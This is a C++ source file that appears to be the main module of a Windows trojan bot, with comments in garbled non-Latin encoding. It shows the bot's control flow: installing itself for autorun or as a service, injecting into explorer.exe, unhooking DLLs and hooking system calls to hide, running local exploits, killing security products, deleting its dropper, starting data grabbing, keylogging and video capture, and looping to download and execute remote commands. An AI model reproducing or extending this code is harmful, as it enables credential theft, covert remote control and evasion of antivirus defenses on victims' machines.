#include <windows.h>

#include "BotCore.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"
#include "BotDef.h"
#include "DbgRpt.h"
#include "Modules.h"



#include "BotDebug.h"

//********************** ���������� ������� **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************




/*char* LogName = "c:\\BotLog.log";

void WriteLog(const char* Msg)
{
	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
	pSetFilePointer(H, 0, 0, FILE_END);
	DWORD W;
	string L;
	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);

//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
//	pWriteFile(H, "\r\n", 2, &W, NULL);
	pCloseHandle(H);
}
*/






#pragma comment(linker, "/ENTRY:MyMain" )
//#pragma comment(linker, "/ENTRY:ExplorerMain" )



WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������
WCHAR FileToDelete[ MAX_PATH ]; //���� ��� �������� ��������������� ����� ����

DWORD dwKillPid		 = 0; //��� ��� �������� �������� ����
DWORD dwFirst	     = 0; //������ � ������ ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
DWORD dwExplorerSelf = 0; //���� ������ ��� � ����������� ���������
//DWORD dwExplorerPid  = 0; //��� ����������


//�������� ��� ����������


void InternalAddToAutorun()
{
	// ��������� ��������� � ������������
	// ������ � ������ ���� � ������� �� ��������������� �������
	// ��������������� �� �������� ��������� �������
	#ifndef DEBUGBOT
		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
		if (Mutex)
		{
			pCloseHandle(Mutex);
			MDBG("Main", "������ ����������. ���������� ���������� � ������������.");
			return;
		}

		bool ServiceInstalled = false;
		if (!WSTR::IsEmpty(TempFileName))
		{
				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);

				BOT::Install(Name, false);
				//BOT::InstallService(Name);
				//BOT::AddToAutoRun(Name);
				STR::Free(Name);
		}
	#endif
}


void DeleteDropper() // ������� �������, ������� ����
{
	
	if ( dwKillPid != 0 && !WSTR::IsEmpty(FileToDelete))
	{
		MDBG("Main", "������� ������");
		pWinStationTerminateProcess(NULL, dwKillPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesW( FileToDelete, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileW(FileToDelete);
	}
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());

	//UnhookDlls();

	BOT::Protect(NULL);

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// ������� ������� svchost
		pExitProcess(1);
	}

	// ��������� ��������������
	#ifdef BotAutoUpdateH
		StartAutoUpdate();
	#endif

	// �������� ����� �������� ������

	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	if( VideoProcess::Start() )
		MDBG( "Main", "��������� ����� �������" );
	else
		MDBG( "Main", "ERROR: �� ���������� ����� �������" );

	if (InitializeTaskManager(NULL, true))
	{
		MDBG("Main", "=====>> �������� ���������� ������");

		while (true)
		{

			DownloadAndExecuteCommand(NULL, NULL);

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
			{
				MDBG("Main", "=====>> ���������� ���������� � �������");
				FirstSended = SendFirstInfo();
			}

			// ���������������� ���������� ������
			if (!TaskManagerSleep(NULL))
				break;
		}

    }
	pExitProcess(0);
	return 0;
}

/*
static DWORD WINAPI NOD32Dll(void*)
{
	BOT::InitializeApi();
	MDBG( "Main", "NOD32Dll()" );
	DWORD dllSize;
	BYTE* dll = File::ReadToBufferA( "c:\\1.dll", dllSize );
	if( dll )
	{
	MDBG( "Main", "NOD32Dll() 1" );
		MemoryLoadLibrary(dll);
	MDBG( "Main", "NOD32Dll() 2" );
		MemFree(dll);
	}
	return 0;
}
*/

void ExplorerMain()
{
	MDBG("Main", "----------------- ExplorerMain -----------------");
	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());

	// ������� ������� ����������� ���� ��� ������������ ������ 
	// �������� �����������.
	BOT::TryCreateBotInstance();

	if ( !dwExplorerSelf )
		UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	//DisableShowFatalErrorDialog();

	MDBG( "Main", "��������� NOD32" );
//	OffNOD32();
//	DWORD dwPid = GetProcessIdByName("ekrn.exe");
//	MDBG( "Main", "NOD32Dll() pid %d", dwPid );
//	InjectIntoProcess2( dwPid, NOD32Dll );

	InternalAddToAutorun();

	DeleteDropper();


	//----------------------------------------------------

	if ( !dwAlreadyRun )
		MegaJump( LoaderRoutine );
	
	#ifdef GrabberH
		if ( dwFirst && !dwGrabberRun )
			MegaJump( GrabberThread ); 
	#endif

	//MegaJump(AvFuckThread);
	
	// 
	HookZwResumeThread();
	HookZwQueryDirectoryFile();


	// �������� ������� c����� ����������

	if (dwFirst)
		ExplorerFirstStart(NULL);

	ExplorerStart(NULL);

}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	BOT::Initialize();

	UnhookDlls();
	
	if (dwExplorerSelf) 
	{
		//���� ������ ��� � ���� ��������� �����������	
		dwExplorerSelf = 0;
		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}
	ExplorerMain();
	return 0;
}


int APIENTRY MyMain() 
{
	BOT::Initialize();

	MDBG("Main", "����������� ���. ������ ���� %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
	
#ifdef INSTALL_BOT_AS_SERVICE
	// ��������� ������ ������� ��� ���
	if (BOT::IsService())
	{
		MDBG("Main", "�������� ������");
		MDBG("Main", "������� ������� %s", BOT::GetBotPath().t_str());
		// ���� ��� ��� ��  �������, �� ��������� ������ � ���������
		BOT::SetBotType(BotService);

		if (!BOT::IsRunning())
		{
			//JmpToExplorer(ExplorerRoutine);
			MDBG("Main", "������ ���������� � Explorer");
			dwExplorerSelf = 1;
			JmpToExplorer(ExplorerRoutine);
		}

		BOT::ExecuteService();
		pExitProcess(0);
		return 0;
	}
#endif

	MDBG("Main", "����������� Ring3 ������ ����");
	// ����������� ����3 ������
	BOT::SetBotType(BotRing3);

	// ��������� �� ������� �� �� ������ ���������� ������ ��������� ����
	if (BOT::IsRunning())
	{
		pExitProcess(0);
		return 0;
	}

	MDBG("Main", "����������� ���. ������ ���� %s", BOT_VERSION);


	//UnhookDlls(); //������� ����

	WCHAR ModulePath[MAX_PATH];

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

	DWORD dwProcessHash = File::GetNameHashW(ModulePath, false);
	DWORD dwProcessHash2 = File::GetNameHashW(ModulePath, true);
	
	MDBG( "Main", "� �������� %S, %08x", ModulePath, dwProcessHash2 );

	bool inExplorer = dwProcessHash2 == 0x490A0972 ? true : false; //true ���� ��������� � �������� ����������

	if ( dwProcessHash == BOT::GetBotExeNameHash()) // ������ �� ������ ����
	{
		KillOutpost();
		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if ( MegaJump( LoaderRoutine ) )
			{
				dwAlreadyRun = 1;
			}
		}

		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				MegaJump( LoaderRoutine );
			}
		}		
	}
	else
	{
		dwFirst = 1;

		KillOutpost();

		DWORD dwExploits = SetExploits();

		if ( !dwExploits )
		{
			if (MegaJump(LoaderRoutine))
			{
				dwAlreadyRun = 1;
			}

			#ifdef GrabberH
				if ( MegaJump( GrabberThread ) )
					dwGrabberRun = 1;
			#endif 
		}

		dwExplorerSelf = 1;
		if( inExplorer )
		{
			MDBG( "Main", "���������� � �������� explorer.exe" );
			FileToDelete[0] = 0; //���� � �������� ����������, �� ������������ �� �����
			TempFileName[0] = 0;
			dwExplorerSelf = 0;
			RunThread( ExplorerRoutine, 0 );
		}
		else
		{
			m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
			dwKillPid = (DWORD)pGetCurrentProcessId();
			CopyFileToTemp( ModulePath, TempFileName );	
			if (!JmpToExplorer(ExplorerRoutine ) )
			{
				dwExplorerSelf = 0;

				InternalAddToAutorun();
			}
		}
	}

	if( !inExplorer) 
		pExitProcess(1);
	return 1;
}